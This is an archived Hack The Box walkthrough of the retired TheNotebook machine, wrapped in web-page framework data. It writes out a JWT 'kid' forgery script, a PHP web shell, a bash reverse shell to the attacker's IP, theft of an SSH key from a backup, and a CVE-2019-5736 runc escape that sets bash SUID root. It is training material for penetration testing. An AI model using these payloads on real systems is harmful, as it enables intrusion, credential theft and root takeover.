@@ -1,0 +1,451 @@
+1:"$Sreact.fragment"
+2:I[4236,[],""]
+3:I[170,[],""]
+5:I[6025,[],"OutletBoundary"]
+6:"$Sreact.suspense"
+9:I[6025,[],"ViewportBoundary"]
+b:I[6025,[],"MetadataBoundary"]
+d:I[4168,[],"default",1]
+:HL["/_next/static/css/d6e294cd2610ae11.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-thenotebook-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-thenotebook-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/d6e294cd2610ae11.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[["$","title",null,{"children":"404: This page could not be found."}],["$","div",null,{"style":{"fontFamily":"system-ui,\"Segoe UI\",Roboto,Helvetica,Arial,sans-serif,\"Apple Color Emoji\",\"Segoe UI Emoji\"","height":"100vh","textAlign":"center","display":"flex","flexDirection":"column","alignItems":"center","justifyContent":"center"},"children":["$","div",null,{"children":[["$","style",null,{"dangerouslySetInnerHTML":{"__html":"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}"}}],["$","h1",null,{"className":"next-error-h1","style":{"display":"inline-block","margin":"0 20px 0 0","padding":"0 23px 0 0","fontSize":24,"fontWeight":500,"verticalAlign":"top","lineHeight":"49px"},"children":404}],["$","div",null,{"style":{"display":"inline-block"},"children":["$","h2",null,{"style":{"fontSize":14,"fontWeight":400,"lineHeight":"49px","margin":0},"children":"This page could not be found."}]}]]}]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"{\"@context\":\"https://schema.org\",\"@graph\":[{\"@type\":\"Person\",\"@id\":\"https://cyberkareem.com/#person\",\"name\":\"Abdullah Kareem\",\"alternateName\":\"CyberKareem\",\"url\":\"https://cyberkareem.com\",\"jobTitle\":\"Security Researcher and Penetration Tester\",\"knowsAbout\":[\"Vulnerability research\",\"Penetration testing\",\"Responsible disclosure\",\"Web application security\",\"API security\",\"Mobile application security\",\"Infrastructure security\",\"Active Directory security\",\"Wireless security\",\"Application security consulting\"],\"sameAs\":[\"https://www.linkedin.com/in/cyberkareem/\",\"https://github.com/CyberKareem\",\"https://x.com/cyberkareem\",\"https://linktr.ee/cyberkareem\",\"https://app.hackthebox.com/public/users/349278\",\"https://www.credential.net/profile/cyberkareem/wallet\",\"https://www.credly.com/users/cyberkareem/badges\"]},{\"@type\":\"WebSite\",\"@id\":\"https://cyberkareem.com/#website\",\"url\":\"https://cyberkareem.com\",\"name\":\"CyberKareem — Abdullah Kareem\",\"publisher\":{\"@id\":\"https://cyberkareem.com/#person\"}}]}"}}]]}]}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":[null,["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","forbidden":"$undefined","unauthorized":"$undefined"}]]}],{"children":[["$","$1","c",{"children":["$L4",null,["$","$L5",null,{"children":["$","$6",null,{"name":"Next.MetadataOutlet","children":"$@7"}]}]]}],{},null,false,null]},null,false,"$@8"]},null,false,"$@8"]},null,false,null],["$","$1","h",{"children":[null,["$","$L9",null,{"children":"$La"}],["$","div",null,{"hidden":true,"children":["$","$Lb",null,{"children":["$","$6",null,{"name":"Next.Metadata","children":"$Lc"}]}]}],null]}],false]],"m":"$undefined","G":["$d",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"65jXSdzueZKnFbMeYrtpi"}
+e:[]
+8:"$We"
+f:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+10:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+:HL["/writing/covers/hackthebox-thenotebook-walkthrough.webp","image"]
+4:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$Lf",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","a","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","a","/about",{"href":"/about","aria-current":"$undefined","children":"About"}]]}],["$","$Lf",null,{"className":"utility-link","href":"/contact#assessment-enquiries","aria-current":"$undefined","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L10",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$Lf",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: TheNotebook Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box TheNotebook machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T10:47:55.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[15," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-thenotebook-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box TheNotebook machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official TheNotebook machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/thenotebook","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/6f71c80df73bdd98a80290cd75796ac79a3c0ab9/HTB-TheNotebook.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 6f71c80df73b",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["TheNotebook"," · Linux"," · Medium"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/thenotebook","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L11"]}]]}],["$L12","$L13","$L14"]]}],"$L15"]}]]}],"$L16"]}],"$L17","$L18"]
+11:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+12:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box TheNotebook machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+13:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+14:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"9 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+19:T6659,
+<p><strong>Target IP:</strong> <code>10.129.13.33</code><br /><strong>Attacker IP (Kali):</strong> <code>10.10.16.84</code><br /><strong>OS:</strong> Linux (Ubuntu 18.04)<br /><strong>Difficulty:</strong> Medium<br /><strong>Flags:</strong></p>
+<ul>
+<li>User: <code>d208e[redacted]e762a26</code></li>
+<li>Root: <code>513fca[redacted]3ff500d5</code></li>
+</ul>
+<hr />
+
+
+
+<h2 id="phase-1-initial-reconnaissance">Phase 1: Initial Reconnaissance</h2>
+<h3 id="what-we-did">What We Did</h3>
+<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.13.33
+nmap -p 22,80 -sCV 10.129.13.33
+</code></pre>
+<h3 id="results">Results</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+</code></pre>
+<h3 id="hacker-mindset">Hacker Mindset</h3>
+<p><strong>Why nmap first?</strong> Before attacking anything, we need to understand the attack surface. Port scanning tells us what services are listening, what versions are running, and gives us our first clues about the operating system. The <code>--min-rate 10000</code> speeds up the scan by sending packets faster — on HTB, speed matters when boxes reset.</p>
+<p><strong>What do these results tell us?</strong></p>
+<ul>
+<li><strong>SSH (22):</strong> OpenSSH 7.6p1 on Ubuntu. This version is from Ubuntu 18.04 Bionic. No obvious public exploit for this specific version, but it's our likely lateral movement path later.</li>
+<li><strong>HTTP (80):</strong> nginx 1.14.0. A webserver means a web application, and web applications are the #1 attack vector on HTB boxes. This is where we focus our energy.</li>
+<li><strong>Only 2 ports open:</strong> This is a "web → user → root" style box. The foothold will be through the web application.</li>
+</ul>
+<p><strong>Why not attack SSH directly?</strong> Brute-forcing SSH is slow, noisy, and rarely works on HTB. We only use SSH after we've obtained credentials or keys through other means.</p>
+<hr />
+<h2 id="phase-2-web-enumeration-and-jwt-discovery">Phase 2: Web Enumeration &amp; JWT Discovery</h2>
+<h3 id="what-we-did-2">What We Did</h3>
+<ol>
+<li>Visited <code>http://10.129.13.33</code> — found a note-taking application</li>
+<li>Clicked <strong>Register</strong> and created an account</li>
+<li>Logged in and observed the cookie</li>
+<li>Directory brute-force discovered <code>/admin</code> (403 Forbidden)</li>
+</ol>
+<h3 id="hacker-mindset-2">Hacker Mindset</h3>
+<p><strong>Why register for an account?</strong> Many web apps have different functionality for authenticated vs. unauthenticated users. By registering, we get a valid session and can explore the authenticated attack surface. We also get to see how the application handles authentication — cookies, tokens, session IDs, etc.</p>
+<p><strong>The auth cookie we received:</strong></p>
+<pre><code>auth=REDACTED encoded lab material].[redacted encoded lab material].[signature]
+</code></pre>
+<p><strong>Why does this cookie look suspicious?</strong></p>
+<ul>
+<li>It's separated by periods (<code>.</code>). This is the classic structure of a <strong>JSON Web Token (JWT)</strong>: <code>header.payload.signature</code></li>
+<li>JWTs are extremely common in modern web apps but are also frequently misconfigured</li>
+<li>The presence of <code>/admin</code> returning 403 suggests there's an authorization check we need to bypass</li>
+</ul>
+<p><strong>Why check cookies?</strong> The cookie is REDACTED application's way of tracking who you are. If we can forge or manipulate it, we can become someone else — like an admin.</p>
+<hr />
+<h2 id="phase-3-jwt-theory-and-the-kid-injection">Phase 3: JWT Theory &amp; The <code>kid</code> Injection</h2>
+<h3 id="decoding-the-jwt">Decoding the JWT</h3>
+<p>Using <a href="https://jwt.io" target="_blank" rel="nofollow noopener noreferrer">jwt.io</a> or Python, we decode the token:</p>
+<p>**REDACTED</p>
+<pre><code class="language-json" data-language="json">{
+  "typ": "JWT",
+  "alg": "RS256",
+  "kid": "http://localhost:7070/privKey.key"
+}
+</code></pre>
+<p><strong>Payload:</strong></p>
+<pre><code class="language-json" data-language="json">{
+  "username": "testuser",
+  "email": "test@test.test",
+  "admin_cap": 0
+}
+</code></pre>
+<h3 id="hacker-mindset-understanding-jwts">Hacker Mindset: Understanding JWTs</h3>
+<p><strong>What is RS256?</strong> It's RSA-with-SHA256, an <strong>asymmetric</strong> algorithm. The server signs the token with a <strong>private key</strong>, and anyone can verify it with the corresponding <strong>public key</strong>.</p>
+<p><strong>What is <code>kid</code>?</strong> The "Key ID" header parameter tells the server WHICH key to use for verification. It's supposed to be an internal identifier (like "key-1" or "prod-signing-key").</p>
+<p><strong>Why is this <code>kid</code> suspicious?</strong> 
+Instead of an internal identifier, it's a <strong>full URL</strong>: <code>http://localhost:7070/privKey.key</code></p>
+<p>This means the server is <strong>dynamically fetching the verification key from a URL</strong> every time it validates a token. That's not how <code>kid</code> is supposed to work — <code>kid</code> should map to a pre-configured key in a local store (database, file system, etc.).</p>
+<p><strong>The vulnerability:</strong> If the server fetches the verification key from an arbitrary URL specified in the JWT header, we can change that URL to point to a key WE control. This is called <strong>JWT Key ID (<code>kid</code>) Injection</strong> or <strong>JWT Key Confusion via <code>kid</code></strong>.</p>
+<p><strong>Why does this work?</strong></p>
+<ol>
+<li>We generate our own RSA key pair</li>
+<li>We sign a forged JWT with our private key</li>
+<li>We set <code>kid</code> to point to our server: <code>http://10.10.16.84:7070/privKey.key</code></li>
+<li>The target server fetches our key from our server</li>
+<li>The target verifies our signature against our key → validation passes</li>
+<li>The target trusts the payload → we become admin</li>
+</ol>
+<p><strong>The "admin_cap" field:</strong> This is a custom claim in the payload. <code>0</code> = regular user, <code>1</code> = admin. By changing this to <code>1</code>, the application will treat us as an administrator.</p>
+<hr />
+<h2 id="phase-4-forging-admin-access">Phase 4: Forging Admin Access</h2>
+<h3 id="step-by-step-exploitation">Step-by-Step Exploitation</h3>
+<h4 id="1-generate-our-own-rsa-private-key">1. Generate our own RSA private key</h4>
+<pre><code class="language-bash" data-language="bash">openssl genrsa -out privKey.key 2048
+</code></pre>
+<p><strong>Why generate a key?</strong> We need to sign our forged JWT with a private key. The server will then fetch the corresponding public key (or in this case, the private key file itself) from our server to verify the signature.</p>
+<h4 id="2-host-the-key">2. Host the key</h4>
+<pre><code class="language-bash" data-language="bash">python3 -m http.server 7070
+</code></pre>
+<p><strong>Why host it?</strong> The <code>kid</code> URL must be accessible from the target server. By running a simple Python HTTP server, we can serve our key file.</p>
+<h4 id="3-forge-the-jwt">3. Forge the JWT</h4>
+<p>We used a Python script to create the forged token:</p>
+<pre><code class="language-python" data-language="python">import jwt
+
+private_key = open('privKey.key', 'r').read()
+
+headers = {
+    "typ": "JWT",
+    "alg": "RS256",
+    "kid": "http://10.10.16.84:7070/privKey.key"
+}
+
+payload = {
+    "username": "testuser",
+    "email": "test@test.test",
+    "admin_cap": 1
+}
+
+token = REDACTED, private_key, algorithm="RS256", headers=headers)
+print(token)
+</code></pre>
+<p><strong>What changed?</strong></p>
+<ul>
+<li><code>kid</code>: Changed from <code>localhost:7070</code> to our Kali IP <code>10.10.16.84:7070</code></li>
+<li><code>admin_cap</code>: Changed from <code>0</code> to <code>1</code></li>
+<li>Signed with OUR private key instead of the server's</li>
+</ul>
+<h4 id="4-replace-the-cookie-and-access-admin">4. Replace the cookie and access /admin</h4>
+<ul>
+<li>Open browser DevTools → Application → Cookies</li>
+<li>Replace the <code>auth</code> cookie with the forged token</li>
+<li>Visit <code>http://10.129.13.33/admin</code></li>
+</ul>
+<p><strong>What happened?</strong> The target server made an HTTP request to our Kali machine at <code>10.10.16.84:7070/privKey.key</code>, fetched our key, verified the signature, saw <code>admin_cap: 1</code>, and granted us admin access.</p>
+<h3 id="hacker-mindset-3">Hacker Mindset</h3>
+<p><strong>Why does the server trust our key?</strong> Because the developer made a critical mistake: they allowed the <code>kid</code> parameter to contain an arbitrary URL and didn't validate it against a whitelist. In a secure application, the server should only use pre-configured keys from trusted sources, never fetch keys from user-supplied URLs.</p>
+<p><strong>What if it didn't work?</strong> Common failure points:</p>
+<ul>
+<li>Wrong IP in <code>kid</code> (must be reachable from target)</li>
+<li>HTTP server not running or blocked by firewall</li>
+<li>Wrong key file being served (must match the signing key)</li>
+<li>The server might require <code>https://</code> instead of <code>http://</code></li>
+</ul>
+<hr />
+<h2 id="phase-5-web-shell-upload-and-execution">Phase 5: Web Shell Upload &amp; Execution</h2>
+<h3 id="what-we-found-in-admin-panel">What We Found in Admin Panel</h3>
+<p>The admin panel had:</p>
+<ul>
+<li>View Notes (all users' notes)</li>
+<li>Upload File functionality</li>
+</ul>
+<p>One note hinted: "PHP files are being executed" and "regular backups scheduled."</p>
+<h3 id="uploading-the-shell">Uploading the Shell</h3>
+<p>Created <code>shell.php</code>:</p>
+<pre><code class="language-php" data-language="php">&lt;?php system($_REQUEST["cmd"]); ?&gt;
+</code></pre>
+<p>Uploaded it. The server renamed it to a hex string but kept the <code>.php</code> extension:</p>
+<pre><code>[redacted retired-lab hash or flag].php
+</code></pre>
+<h3 id="verifying-execution">Verifying Execution</h3>
+<pre><code>http://10.129.13.33/[redacted retired-lab hash or flag].php?cmd=id
+</code></pre>
+<p>Output:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<h3 id="hacker-mindset-4">Hacker Mindset</h3>
+<p><strong>Why PHP?</strong> The note explicitly told us PHP was being executed. This is a huge hint — the developer left a breadcrumb. Always read notes, comments, and source code carefully.</p>
+<p><strong>Why a simple one-liner?</strong> We don't need a full reverse shell payload yet. A minimal <code>system()</code> wrapper gives us RCE (Remote Code Execution) with the smallest possible file. We can use it to trigger a reverse shell later.</p>
+<p><strong>The architecture quirk:</strong> This box has a fascinating setup:</p>
+<ul>
+<li>nginx listens on port 80</li>
+<li>For <code>.php</code> files → forwarded to PHP-FPM (executes on the <strong>host</strong>)</li>
+<li>For everything else → proxied to a Docker container on port 8080</li>
+</ul>
+<p>This means our PHP shell executes on the <strong>host machine</strong>, not in the container! This is crucial because it gives us direct host access instead of being trapped in a container.</p>
+<p><strong>Why does this matter?</strong> If the upload had gone to the Docker container, we'd be containerized and need to escape. But because PHP files are handled by the host's PHP-FPM, our shell runs directly on the host as <code>www-data</code>.</p>
+<hr />
+<h2 id="phase-6-shell-stabilization-and-enumeration">Phase 6: Shell Stabilization &amp; Enumeration</h2>
+<h3 id="getting-a-proper-shell">Getting a Proper Shell</h3>
+<p>Using the web shell, we triggered a reverse shell:</p>
+<pre><code class="language-bash" data-language="bash"># Kali listener
+nc -lnvp 4444
+</code></pre>
+<pre><code class="language-bash" data-language="bash"># Via browser/curl
+curl --data-urlencode "cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.84/4444 0&gt;&amp;1'" \
+  -G -s "http://10.129.13.33/[redacted retired-lab hash or flag].php"
+</code></pre>
+<h3 id="upgrading-the-shell">Upgrading the Shell</h3>
+<pre><code class="language-bash" data-language="bash"># In reverse shell
+script /dev/null -c bash
+# Ctrl+Z to background nc
+# In Kali terminal:
+stty raw -echo; fg
+reset
+# Terminal type: screen
+</code></pre>
+<h3 id="hacker-mindset-5">Hacker Mindset</h3>
+<p><strong>Why stabilize the shell?</strong> A basic netcat reverse shell:</p>
+<ul>
+<li>Has no job control (Ctrl+C kills it)</li>
+<li>Can't run interactive programs (vim, sudo, etc.)</li>
+<li>Doesn't handle special keys properly</li>
+</ul>
+<p>Upgrading with <code>script</code> + <code>stty raw</code> gives us a proper TTY, making enumeration much easier.</p>
+<h3 id="enumeration-as-www-data">Enumeration as www-data</h3>
+<pre><code class="language-bash" data-language="bash">whoami  # www-data
+id      # uid=33(www-data)
+ls /home/  # Found user: noah
+ls -la /var/backups/  # Found home.tar.gz
+</code></pre>
+<p><strong>Why check <code>/var/backups/</code>?</strong> The admin note mentioned "regular backups scheduled." This is a classic example of following hints left by the box creator. Backups often contain sensitive data — passwords, private keys, configuration files.</p>
+<hr />
+<h2 id="phase-7-lateral-movement-to-noah">Phase 7: Lateral Movement to Noah</h2>
+<h3 id="extracting-the-ssh-key">Extracting the SSH Key</h3>
+<pre><code class="language-bash" data-language="bash">tar xf /var/backups/home.tar.gz -O home/noah/.ssh/id_rsa
+</code></pre>
+<p>This printed Noah's private RSA key. We saved it on Kali as <code>noah_id_rsa</code> and set proper permissions:</p>
+<pre><code class="language-bash" data-language="bash">chmod 600 noah_id_rsa
+ssh -i noah_id_rsa noah@10.129.13.33
+</code></pre>
+<h3 id="user-flag">User Flag</h3>
+<pre><code class="language-bash" data-language="bash">cat ~/user.txt
+# d208e5[redacted]0e762a26
+</code></pre>
+<h3 id="hacker-mindset-6">Hacker Mindset</h3>
+<p><strong>Why SSH keys?</strong> SSH keys are the holy grail of lateral movement. If you find a private key, you can authenticate as that user without knowing their password. This is why <code>~/.ssh/</code> should always be checked during enumeration.</p>
+<p><strong>Why was the backup world-readable?</strong> The backup files in <code>/var/backups/</code> were owned by root but readable by anyone (<code>-rw-r--r--</code>). This is a permission misconfiguration — sensitive backups should never be world-readable.</p>
+<p><strong>Why extract without writing to disk?</strong> Using <code>tar -O</code> (stdout) lets us read the key without creating files on the target that might trigger alerts or leave evidence.</p>
+<hr />
+<h2 id="phase-8-privilege-escalation-docker-analysis">Phase 8: Privilege Escalation: Docker Analysis</h2>
+<h3 id="checking-sudo-permissions">Checking sudo Permissions</h3>
+<pre><code class="language-bash" data-language="bash">sudo -l
+</code></pre>
+<p>Output:</p>
+<pre><code>User noah may run the following commands on thenotebook:
+    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+</code></pre>
+<h3 id="checking-docker-version">Checking Docker Version</h3>
+<pre><code class="language-bash" data-language="bash">docker -v
+# Docker version 18.06.0-ce, build 0ffa825
+</code></pre>
+<h3 id="hacker-mindset-7">Hacker Mindset</h3>
+<p><strong>Why check <code>sudo -l</code> first?</strong> It's the golden rule of Linux privilege escalation. <code>sudo -l</code> tells you exactly what commands you can run as root without a password. Even a single misconfigured command can lead to full root access.</p>
+<p><strong>Why is Docker dangerous?</strong> Docker is essentially root access with extra steps. If you can run Docker commands as root, you can:</p>
+<ul>
+<li>Mount the host filesystem inside a container</li>
+<li>Escape containers using kernel vulnerabilities</li>
+<li>In this case, exploit a known Docker/runc vulnerability</li>
+</ul>
+<p><strong>Why check the Docker version?</strong> Docker version 18.06.0-ce is <strong>old</strong> (from mid-2018). Old software = vulnerabilities. A quick search reveals this version is vulnerable to <strong>CVE-2019-5736</strong>.</p>
+<hr />
+<h2 id="phase-9-cve-2019-5736-theory-of-the-runc-escape">Phase 9: CVE-2019-5736: Theory of the Runc Escape</h2>
+<h3 id="what-is-runc">What is runc?</h3>
+<p><strong>runc</strong> is the low-level container runtime that Docker uses under the hood. When you run <code>docker exec</code>, Docker calls runc to actually start the process inside the container. Runc is a small, privileged binary that runs as <strong>root</strong> on the host.</p>
+<h3 id="the-vulnerability">The Vulnerability</h3>
+<p>CVE-2019-5736 is a critical vulnerability in runc (affecting versions before 1.0.0-rc7, used by Docker before 18.09.2). It allows an attacker with <strong>root access inside a container</strong> to overwrite the host's runc binary.</p>
+<h3 id="how-the-attack-works">How the Attack Works</h3>
+<ol>
+<li><strong>Overwrite <code>/bin/sh</code> inside the container</strong> with a symlink to <code>/proc/self/exe</code></li>
+<li><strong>Wait for someone to run <code>docker exec</code></strong> on the host</li>
+<li>When runc tries to execute <code>/bin/sh</code> inside the container, it follows the symlink to <code>/proc/self/exe</code> — which points to the <strong>runc binary itself</strong> on the host</li>
+<li><strong>runc opens itself</strong> (its own binary) to read/execute it</li>
+<li>The attacker finds the PID of this runc process and opens <code>/proc/[pid]/exe</code> for writing</li>
+<li>The attacker <strong>overwrites the runc binary on the host</strong> with a malicious payload</li>
+<li>The next time anyone runs <code>docker exec</code>, the <strong>malicious payload executes as root on the host</strong></li>
+</ol>
+<h3 id="hacker-mindset-8">Hacker Mindset</h3>
+<p><strong>Why does this work?</strong> It's a race condition combined with a confused deputy problem:</p>
+<ul>
+<li><code>/proc/self/exe</code> is a special symlink that points to the currently running executable</li>
+<li>When runc executes <code>/bin/sh</code> (which is a symlink to <code>/proc/self/exe</code>), runc ends up executing <strong>itself</strong></li>
+<li>While runc has its own binary open, the container's root can write to that same file through <code>/proc/[pid]/exe</code></li>
+<li>Since runc is owned by root on the host, overwriting it gives us persistent root code execution</li>
+</ul>
+<p><strong>Why is this so dangerous?</strong> Because containers are supposed to be isolated. This vulnerability breaks that isolation completely — a container escape leads directly to host root access.</p>
+<hr />
+<h2 id="phase-10-exploitation-container-breakout">Phase 10: Exploitation: Container Breakout</h2>
+<h3 id="step-1-build-the-exploit">Step 1: Build the Exploit</h3>
+<p>We downloaded the Go PoC from <a href="https://github.com/Frichetten/CVE-2019-5736-PoC" target="_blank" rel="nofollow noopener noreferrer">Frichetten/CVE-2019-5736-PoC</a>.</p>
+<p><strong>The payload we used:</strong></p>
+<pre><code class="language-go" data-language="go">var payload = "#!/bin/bash \n chmod u+s /bin/bash"
+</code></pre>
+<p>This makes <code>/bin/bash</code> on the host SUID root, meaning anyone can run <code>bash -p</code> to get a root shell.</p>
+<p><strong>Why SUID bash instead of SSH keys?</strong> Our first attempt tried to write an SSH key to <code>/root/.ssh/authorized_keys</code>, but the exploit's race condition failed to complete the write. The SUID approach is more reliable because:</p>
+<ul>
+<li>It doesn't depend on <code>.ssh</code> directory existing or having correct permissions</li>
+<li>It doesn't depend on SSH configuration</li>
+<li>A single <code>chmod</code> system call is simpler than writing to a file</li>
+</ul>
+<p><strong>Cross-compilation issue:</strong> Our Kali was ARM64, but the target is x86_64. We installed the official Go compiler and cross-compiled:</p>
+<pre><code class="language-bash" data-language="bash">export PATH=/usr/local/go/bin:$PATH
+CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o cve-2019-5736 cve-2019-5736.go
+</code></pre>
+<h3 id="step-2-two-session-attack">Step 2: Two-Session Attack</h3>
+<p><strong>Session 1 — Inside the container:</strong></p>
+<pre><code class="language-bash" data-language="bash">sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+cd /tmp
+wget 10.10.16.84:8080/cve-2019-5736 -O cve-2019-5736
+chmod +x cve-2019-5736
+./cve-2019-5736
+</code></pre>
+<p>Output:</p>
+<pre><code>[+] Overwritten /bin/sh successfully
+[+] Found the PID: 122
+[+] Successfully got the file handle
+[+] Successfully got the write handle &amp;{0xc0004349c0}
+[+] The command executed is#!/bin/bash 
+ chmod u+s /bin/bash
+</code></pre>
+<p><strong>Session 2 — Trigger on the host:</strong></p>
+<pre><code class="language-bash" data-language="bash">sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+# Output: No help topic for '/bin/sh'
+</code></pre>
+<h3 id="hacker-mindset-9">Hacker Mindset</h3>
+<p><strong>Why two sessions?</strong> The exploit needs a trigger. Session 1 sets the trap (overwrites <code>/bin/sh</code>), then waits. Session 2 springs the trap by running <code>docker exec</code>, which causes runc to execute and open itself. The exploit in Session 1 detects this and overwrites runc.</p>
+<p><strong>Why does the trigger show a weird error?</strong> Because <code>/bin/sh</code> has been overwritten with a symlink to <code>/proc/self/exe</code>. When runc tries to execute it, it's actually trying to execute itself with <code>/bin/sh</code> as an argument. Runc doesn't understand this, hence the bizarre error message — but the exploit has already fired by this point.</p>
+<hr />
+<h2 id="phase-11-root-access">Phase 11: Root Access</h2>
+<h3 id="the-payoff">The Payoff</h3>
+<p>In Session 2 (as noah on the host):</p>
+<pre><code class="language-bash" data-language="bash">bash -p
+whoami
+# root
+id
+# uid=1000(noah) gid=1000(noah) euid=0(root) groups=1000(noah)
+cat /root/root.txt
+# 513fcaf[redacted]63ff500d5
+</code></pre>
+<h3 id="hacker-mindset-10">Hacker Mindset</h3>
+<p><strong>Why <code>bash -p</code>?</strong> The <code>-p</code> flag tells bash to run with privileged mode, preserving the effective UID. Since <code>/bin/bash</code> is now SUID root, running <code>bash -p</code> gives us a root shell while keeping our noah identity for file ownership purposes.</p>
